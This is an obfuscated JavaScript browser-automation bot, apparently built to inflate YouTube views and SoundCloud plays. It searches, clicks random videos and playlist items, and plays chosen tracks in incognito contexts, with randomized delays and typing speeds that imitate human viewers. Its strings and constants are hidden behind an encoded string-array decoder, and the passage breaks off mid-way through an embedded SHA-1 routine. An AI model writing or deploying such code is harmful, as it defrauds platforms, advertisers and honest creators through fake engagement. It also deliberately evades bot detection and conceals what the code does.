const W = b,
  V = c,
  U = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x2575 + -0x3b * 0x4f + -0x133f * 0x1))) + i;
}
async function createPage(f, h) {
  const R = d;
  let i = await f['newPage']();
  return await i['setDefault' + R(0x12) + 'Timeout'](0xd41 + -0x1b9c + 0xe5b), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x4606 + 0x32 * -0x37 + 0x39e8 + (-0x740f + 0x5c19 + 0x528e * 0x1) * random()) : await standardWaitForNetIdle(f), await wait(0x25b5 + -0x5 * 0x737 + -0x4f * -0x3a + (0x1687 + -0x52 * -0x95 + -0x1f31) * random()), 0x1 * 0x11d1 + -0x651 * -0x4 + -0x2b14;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1061 * -0x2 + -0x33c + -0x9fe), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x691 + 0x744 + -0x127 * 0xc;
}
async function randomWait() {
  return await wait(-0x5db + -0x5 * -0x3df + -0x304 * -0x2 + (0x2d2 + 0x5 * -0x743 + 0x3505) * random()), 0x1b04 + -0x216 + -0x18ed;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x13f4 + 0x16a3 + -0x1 * 0x2a97, -0x1e42 + -0x15d + 0x1 * 0x1fa6), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x139df + 0x4262 + 0xa09f * 0x3) * getRandomInt(0x1396 + -0x3ce + 0x542 * -0x3, -0x1 * -0x125 + 0x43 * 0x1 + -0x163), h)), 0x22e5 + 0x1d * -0xd0 + 0x1d * -0x64;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x125d + 0x11f + 0x113e);
    let h = e[f];
    if (b['WICWwQ'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1 * -0x1c9a + 0x15d5 + -0x6c5 * -0x1, s, t, u = 0x69 * -0x14 + 0x2226 + -0x19f2; t = n['charAt'](u++); ~t && (s = r % (0x2575 + -0x3b * 0x4f + -0x133c * 0x1) ? s * (0xd41 + -0x1b9c + 0xe9b) + t : t, r++ % (0xbac + 0x2 * -0xe5 + -0x9de)) ? p += String['fromCharCode'](-0x26b0 + 0x1eb3 + 0x8fc * 0x1 & s >> (-(0x25b5 + -0x5 * 0x737 + -0x1a * 0x10) * r & 0xb43 + -0x29 * -0x95 + -0x231a)) : 0x1 * 0x11d1 + -0x651 * -0x4 + -0x2b15) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1061 * -0x2 + -0x33c + -0x1d86, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x691 + 0x744 + -0xeb * 0xf))['slice'](-(-0x5db + -0x5 * -0x3df + -0x6bf * 0x2));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x2d2 + 0x5 * -0x743 + 0x217d,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1b04 + -0x216 + -0x18ee; u < 0x13f4 + 0x16a3 + -0x15 * 0x1fb; u++) {
          p[u] = u;
        }
        for (u = -0x1e42 + -0x15d + 0x1 * 0x1f9f; u < -0x1a28 + 0x588 + 0x568 * 0x4; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1396 + -0x3ce + 0x158 * -0xb), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1 * -0x125 + 0x43 * 0x1 + -0x168, q = 0x22e5 + 0x1d * -0xd0 + 0x3 * -0x3c7;
        for (let v = -0x772 + -0x21f0 + -0x2962 * -0x1; v < n['length']; v++) {
          u = (u + (0x20ba + -0xad * 0x5 + -0x1d58)) % (0xe03 * -0x2 + -0xe9 * -0x17 + 0x6d * 0x13), q = (q + p[u]) % (-0x865 + 0x1 * -0x2f + 0x1 * 0x994), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1 * 0x1ebb + -0x8 * 0xa7 + -0x1883)]);
        }
        return t;
      };
      b['stXaqF'] = m, c = arguments, b['WICWwQ'] = !![];
    }
    const j = e[-0x4 * -0x519 + -0xdf * -0x1f + -0x2f65],
      k = f + j,
      l = c[k];
    return !l ? (b['RRwkLV'] === undefined && (b['RRwkLV'] = !![]), h = b['stXaqF'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x772 + -0x21f0 + -0x2962 * -0x1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x20ba + -0xad * 0x5 + -0x1d58]['split']('\x20');
    for (let k = 0xe03 * -0x2 + -0xe9 * -0x17 + 0x37 * 0x21; k < i['length']; k += -0x865 + 0x1 * -0x2f + 0x1 * 0x896)
      j += i[k] * h[i[k + (0x1 * 0x1ebb + -0x8 * 0xa7 + -0x1982)]];
    return j;
  });
}

function a() {
  const bl = [
    'CMCVzw4VC2nYAq',
    'W7hcGXpdT8krESotWPiJEa',
    '4QZlfXxorJ',
    'U9ExFM1pji',
    'Ahr0Chm6lY9NCG',
    'https://gr',
    'W5q8W6pdJCkLu8o0C8oyWQa',
    'w8kaWQivAmkMWOL3WQhcSq',
    'ould-know-',
    'zsb5DgqTCMLJAa',
    ',bts\x20play\x20',
    'z29PBMCGDg8GzG',
    'W53dMfHTeCo5WQTjCqK',
    'C2XPy2u',
    'zwfZEwzVCMSUBW',
    'z2v0',
    've5hr09ND1b0yW',
    'enuserjs.o',
    'Navigation',
    '\x22Not\x20A(Bra',
    'ts4bfmkKt0PdWRuE',
    'lw1VzhmTBw9VBq',
    'ok/is-your',
    'evRcQwf6b8kubr1U',
    'd,sad\x20bts,',
    'li/Amazon_'
  ];
  a = function() {
    return bl;
  };
  return a();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x125d + 0x11f + 0x113e);
    let h = e[f];
    if (c['Rbnhnw'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1 * -0x1c9a + 0x15d5 + -0x6c5 * -0x1, r, s, t = 0x69 * -0x14 + 0x2226 + -0x19f2; s = m['charAt'](t++); ~s && (r = q % (0x2575 + -0x3b * 0x4f + -0x133c * 0x1) ? r * (0xd41 + -0x1b9c + 0xe9b) + s : s, q++ % (0xbac + 0x2 * -0xe5 + -0x9de)) ? o += String['fromCharCode'](-0x26b0 + 0x1eb3 + 0x8fc * 0x1 & r >> (-(0x25b5 + -0x5 * 0x737 + -0x1a * 0x10) * q & 0xb43 + -0x29 * -0x95 + -0x231a)) : 0x1 * 0x11d1 + -0x651 * -0x4 + -0x2b15) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1061 * -0x2 + -0x33c + -0x1d86, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x691 + 0x744 + -0xeb * 0xf))['slice'](-(-0x5db + -0x5 * -0x3df + -0x6bf * 0x2));
        }
        return decodeURIComponent(p);
      };
      c['SfWMQF'] = i, b = arguments, c['Rbnhnw'] = !![];
    }
    const j = e[0x2d2 + 0x5 * -0x743 + 0x217d],
      k = f + j,
      l = b[k];
    return !l ? (h = c['SfWMQF'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = c,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + S(0x9) + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x4 * -0x519 + -0xdf * -0x1f + -0x2f5f)['map'](l => Array['from'](l['children']))['flat'](-0xb47 + 0x1 * -0x1f8d + 0x2ad5 * 0x1)['map'](l => l['childNodes'][0x1ad3 + -0x572 + 0x6 * -0x390]['childNodes'][0xdc5 + -0x257b + -0x1 * -0x17b6]['childNodes'][-0x4e5 * 0x5 + 0x1f * 0xf9 + -0x5ad]['childNodes'][-0x1fc9 + -0x11 * -0x96 + -0x15d3 * -0x1]['childNodes'][-0x5 * -0x14 + 0x54 * 0x58 + -0x1d43]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1ab1 + 0x25 * 0x8b + 0x10d * 0xa, 0x5 * -0x283 + 0x8 * 0x46d + -0x351 * 0x1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x6b0e + 0x6134 * -0x1 + 0x106da);
  const h = await getMaxTime(f),
    i = Math['min']((0x1a6f5 * 0x1 + 0xc548 + -0x181dd) * getRandomInt(0x1 * -0x332 + 0xf41 + -0x269 * 0x5, -0x218 * 0x2 + -0x1 * -0x1f85 + -0x8 * 0x36a), h);
  return await wait(i), -0x205d + 0x1 * 0xe83 + 0x11db;
}
async function frontScreenActions(f) {
  const T = c;
  return log(T(0xb) + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1564 + 0xdf * 0xb + -0x1ef9]['children'][-0x1500 + -0x8c + 0x158c]['children'][-0x2416 + 0x16a4 + 0xd72]['children'][0x1 * -0x1391 + 0x15ce * 0x1 + -0x3 * 0xbf]['children'][0xf * 0xfa + -0x180b + 0x965]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x1ff * 0x3 + -0x2f * 0x81 + 0x11b3;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x125d + 0x11f + 0x113e);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x125f + 0xcf1 + -0x1eec + (0xa8c + 0x1bb2 * -0x1 + 0x1158) * random()
  }), await wait(-0x12a + -0xe * 0x1d3 + -0x4 * -0x72a + (-0xfb9 + -0x2 * 0x799 + 0x1f * 0x109) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x132e + -0x2a5 * -0x7 + 0xad]['childNodes'][-0x1061 + -0x12f2 + 0x2354]['childNodes'][0x1ba * 0x8 + 0x3eb + -0x11ba]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1a23 + 0xf8a + 0xa9e]['childNodes'][0x69 * -0x45 + 0x1 * 0x1865 + -0xa * -0x64]['childNodes'][-0x117 + -0x4 * -0x10 + -0x1 * -0xd9]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xe2 * 0x1c + 0xfb0 + 0x2867 * -0x1),
          r = -0x11 * -0x1 + -0xa * -0x23 + -0x16f * 0x1;
        for (let u = 0x2445 + -0x1496 + 0xfaf * -0x1; u < q['length']; u += 0xd83 * 0x1 + 0x1b49 + -0x1c6 * 0x17)
          r += q[u] * k[q[u + (0x320 + 0x1dff + 0x2 * -0x108f)]];
        return r;
      }(n);
  });
  await wait((-0x1 * 0xadf + -0xe64 + -0x53db * -0x1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x2796 * 0x7 + -0x13c5a + -0x638 * -0x2c) * getRandomInt(0xe1 + 0xd09 + -0xde9, 0x1d21 * 0x1 + -0x602 * -0x4 + -0x351f), h + (0x10b4 + -0x3 * 0x3f7 + 0xeb9));
  return await wait(i), 0x1d * 0xa2 + -0x1bdf + 0x986;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x16b8 + 0x496 + 0x1222), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1ccc + 0x561 * -0x6 + -0xa66 * -0x7 + (-0x194c + 0x6a5 + 0xe7 * 0x19) * Math['random']());
    });
  }, 0x1cf + -0x1 * 0x2fbb + -0x824 * -0x9);
  await wait(0x81646 + -0x67f78 + -0x1c56 * -0x1b);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x6bcd * 0x2 + 0x133 * 0x51 + 0x1 * -0x4e5d) * getRandomInt(-0x723 + 0xca + 0x65d, -0x23d * 0x3 + 0x1 * -0x34b + -0xc7 * -0xd)), clearInterval(h), 0x2596 + -0xd44 + -0x19f * 0xf;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x21d + -0x65 * 0x4a + -0x3 * -0x907;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x32a + 0x43b + 0xb * -0xac;
    await randomWait();
  }
  return -0x592 + -0x7 * 0x1ca + -0x1219 * -0x1;
}

function fetchRandomSC() {
  return Math['random']() <= 0xa0a + 0x1 * -0x21cf + 0x17c5 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x16f8 + -0x16b3 + 0x2dab + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x485 + -0x7 * 0x4a2 + 0x1be9 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0xfe4 + -0x1 * 0xc7 + -0xf1d * 0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x133ff + -0xcbd7 + -0x3a * -0xbdb + getRandomInt(-0x6c57 + 0x2b * -0x6d + 0xb93e, 0xe4bc + -0x5c5 * 0x20 + 0x4914));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x114b + -0x1e49 * 0x1 + 0xcff), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1c42 + -0x1ec1 * 0x1 + -0x1 * -0x27f;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x481 * -0x5 + -0x1 * 0x4cf + -0x11b6, -0x1fa9 + -0x22e1 + 0x42bc)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x999 + -0x279 * -0xd + 0x17 * -0xa4 + floor((0x229 * 0x4 + 0xdd5 * 0x1 + -0x1 * 0x1291) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xfea442a + -0xbdc72714 + 0x14db16b3e),
          -0x59cab5 * 0x1 + 0x2f48ad + 0x616ee * 0x1c,
          -0xd60e * -0x1 + -0x1 * -0x8e3c + -0xe44a,
          0x1cb2 + -0x1 * -0x1e59 + -0x7 * 0x85d
        ], y = [
          0x49b + -0x1355 + 0xed2,
          -0x7d7 * -0x3 + -0xca * -0x22 + -0x3249,
          0x1113 + 0x131 + 0x2 * -0x91e,
          0x181e + -0x1 * 0x2037 + 0x2b3 * 0x3
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x3 * 0x4e8 + -0x29 * 0xc5 + 0x10d6)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x14a5 + 0x2683 + -0x1 * 0x11de; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x201b * 0x1 + -0x23a0 + -0x35 * -0x11) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x8 * -0x482 + 0xb * -0x1d1 + 0x380b] = A[-0x14b * 0x1b + -0x4 * -0x5d4 + 0xc7 * 0xf] = A[0x14c1 + 0x11b * 0x20 + -0x3820] = A[0x249a * -0x1 + 0x84e + 0x1c4e * 0x1] = A[-0x8 * 0x7 + -0x5 * 0x194 + 0x81f] = A[0x264d + 0xa8d * 0x3 + -0x45f0] = A[-0x1f58 + 0x1267 + 0xcf6] = A[-0x97 * 0x29 + -0x27 * 0xa7 + 0x31a6] = A[-0x2 * -0xcaa + 0x1 * 0x24d9 + -0x3e26] = A[-0x116 * -0x2 + -0x25d0 + 0x23ac] = A[0xfad + 0x1bb8 + -0x73a * 0x6] = A[-0x94 * -0x8 + -0x187c + 0x13e6] = A[-0x674 * -0x6 + 0x89a + -0x2f47] = A[-0x1 * -0x14cf + -0x4 * -0x5c0 + -0x1 * 0x2bc3] = A[0x14d4 + 0xc52 + -0x2119] = A[-0xaf8 + 0x1a2b + 0x1 * -0xf25] = A[-0x4 * -0x7f2 + 0x1c56 + -0x3c0f] = -0x1 * 0x21a9 + -0xbf2 + 0x2d9b, this['blocks'] = A) : this['blocks'] = [
                0x1fb * -0xd + 0x2 * -0x7ab + 0xd * 0x329,
                -0x173 * 0x17 + 0x13 * -0xb7 + 0x1775 * 0x2,
                0x6 * -0x5ed + -0x6 * 0x457 + 0xc * 0x522,
                0x17f0 + -0x18f1 + 0x101 * 0x1,
                0x179f + -0x345 + -0x145a,
                0x18e * -0x19 + 0xe01 * 0x1 + 0x13 * 0x14f,
                -0x1d2 + -0x1a1d + 0x1bef,
                0x17 * -0x7b + 0x103f * 0x1 + 0xe * -0x5f,
                0x2d8 + -0x81 * -0x26 + -0x5 * 0x466,
                0x132e + 0x1e83 + -0x31b1,
                0x14f4 + -0xfda + 0x2 * -0x28d,
                0x4b3 * -0x4 + 0x260c + -0x1340,
                0x1 * -0x1215 + 0x3c1 + 0xe54,
                -0x491 + 0x1bcf + -0x55 * 0x46,
                0x1 * 0x13bf + -0x26b9 + 0x12fa,
                0x2 * -0x38c + -0x19be + 0x9 * 0x3a6,
                0x1072 + 0x2 * -0xc7e + -0x2 * -0x445
              ], this['h0'] = 0x449b5 * 0x2851 + -0x1 * 0x29c7ae45 + -0x1bd2c8ff, this['h1'] = -0xdcb52379 + -0x367cfe * -0x8a1 + -0x9a9bcbc, this['h2'] = -0x7 * -0xf230227 + 0x102fc5692 + 0x5b3 * -0x253c47, this['h3'] = 0x2 * -0xf24df19 + 0x11b * -0xaaed2 + 0x3a4b54ce, this['h4'] = 0x18568b6a + 0x2c * -0x23bdc6c + 0x10dc63916, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1c * 0x90 + -0x110e + 0x14e, this['finalized'] = this['hashed'] = -0x1 * 0x1309 + -0x25f9 + -0x1c81 * -0x2, this['first'] = 0x16ad + -0x8d0 + -0xddc;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x61 * -0xd + -0xf03 + 0x50b * 0x2, O = J['length'] || 0x166a + -0x1d2f + 0x6c5, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x8fb + 0x1401 + -0xb06 * 0x1, P[0x1e45 + -0x1 * -0xbe1 + -0x2a26] = this['block'], P[-0x1 * 0x83 + -0x16 * -0x83 + -0xaaf * 0x1] = P[0x53 * 0xb + 0xa0d * -0x1 + 0xb * 0x97] = P[0x1 * -0x237 + -0x8 * -0x19c + 0x1 * -0xaa7] = P[-0x43 * -0x64 + 0x599 * 0x2 + -0x255b] = P[-0xbff + -0x19f9 * 0x1 + 0x12fe * 0x2] = P[0x180e * 0x1 + -0x1b9 * -0x1 + -0x19c2] = P[-0x43a + 0x1634 + -0x11f4] = P[0x209 * -0x3 + 0x1db0 + 0x6 * -0x3ed] = P[0xfb3 + 0x177a + 0x38f * -0xb] = P[-0x1a74 + -0x23b6 + 0x3e33] = P[0xeb4 + 0x23aa + -0x3254] = P[0x130d + -0x1fd6 + 0xcd4] = P[-0x6c * 0x1b + -0x2195 + 0x2d05] = P[-0x106f + -0x48d + -0x703 * -0x3] = P[-0xfd * -0x1f + -0x2 * 0xa22 + -0xa51] = P[0x243 * 0xd + -0x12c2 + -0xa96] = 0x40 * 0x49 + -0x1d03 + 0x91 * 0x13), K) {
                    for (N = this['start']; M < O && N < 0x24a3 * 0x1 + 0xaf1 + 0xe9 * -0x34; ++M)
                      P[N >> 0x1 * -0x1ae7 + 0x4c5 * 0x1 + 0x6d * 0x34] |= J[M] << y[-0x4ab * -0x5 + -0x2 * 0xc2d + -0x1 * -0x106 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0xe4b + -0x1 * -0x21f7 + -0xa * 0x4cd; ++M)
                      (L = J['charCodeAt'](M)) < 0x1fef + -0x1d6d + 0x202 * -0x1 ? P[N >> -0x11 * 0x13 + 0xe9 * -0x13 + -0x84 * -0x24] |= L << y[-0xbca + -0x2 * 0xdf + -0xd8b * -0x1 & N++] : L < -0xbe + 0x44f * -0x2 + 0x115c ? (P[N >> 0x1c * 0x33 + 0x1177 + -0x1709] |= (-0x1917 + -0x2530 + 0x3f07 | L >> 0x13d0 + -0x1823 + 0x35 * 0x15) << y[0x289 + -0x1d7d + 0x1af7 & N++], P[N >> -0x1a8a + -0x2 * 0x871 + 0x2b6e] |= (0x2623 + 0xb0d + 0xa4 * -0x4c | -0x94 * -0x29 + -0x106 + -0x166f & L) << y[0x180d + 0xac1 * 0x3 + -0x384d * 0x1 & N++]) : L < -0x16f5 * 0x1 + 0x2 * -0x4651 + -0x12b * -0x145 || L >= -0x6ca4 + -0xf368 + 0x4 * 0x9003 ? (P[N >> 0x1df6 + -0x1aae + -0x346 * 0x1] |= (0x1 * -0x1321 + 0x142d + -0x4 * 0xb | L >> -0x195d * -0x1 + -0xe07 + -0xb4a) << y[-0x17 * 0xc9 + 0x1e17 * 0x1 + 0x11 * -0xb5 & N++], P[N >> -0x194 * -0xe + -0x89 * 0x34 + 0x5be] |= (-0x48a + 0x797 + 0x28d * -0x1 | L >> 0x114b * 0x2 + -0x79 * 0x43 + -0x2e5 & -0x8 * -0x36a + 0x4 * 0x469 + -0x2cb5) << y[0x13af + -0x1 * -0xa05 + -0x1db1 & N++], P[N >> 0x248a + -0x3c4 + -0x9 * 0x3a4] |= (-0x1dc8 + -0x862 + 0x586 * 0x7 | 0xff1 + -0x102d * 0x1 + 0x7b & L) << y[-0x2288 + -0x1 * -0x1dcb + 0x13 * 0x40 & N++]) : (L = 0x150c7 + -0x4b58 + -0x56f + ((0x1eca + 0x17c8 + 0x6b * -0x79 & L) << -0x1b7b + 0x13cf * 0x1 + 0x7b6 * 0x1 | -0x1 * -0x644 + -0xb * -0x296 + 0xa3d * -0x3 & J['charCodeAt'](++M)), P[N >> 0x2084 + -0x3 * -0x2d2 + -0x28f8] |= (0x3c1 * 0x6 + 0x5 * 0x477 + 0x4e1 * -0x9 | L >> -0x2fa + 0x2539 + -0x222d) << y[0x793 * 0x2 + 0x1c44 + -0x2b67 * 0x1 & N++], P[N >> -0x3b4 * 0x1 + -0x12dd + -0x1 * -0x1693] |= (-0x1 * 0x1b3b + 0x12 * -0x7c + 0x2473 | L >> -0xf14 * 0x1 + -0x1971 + 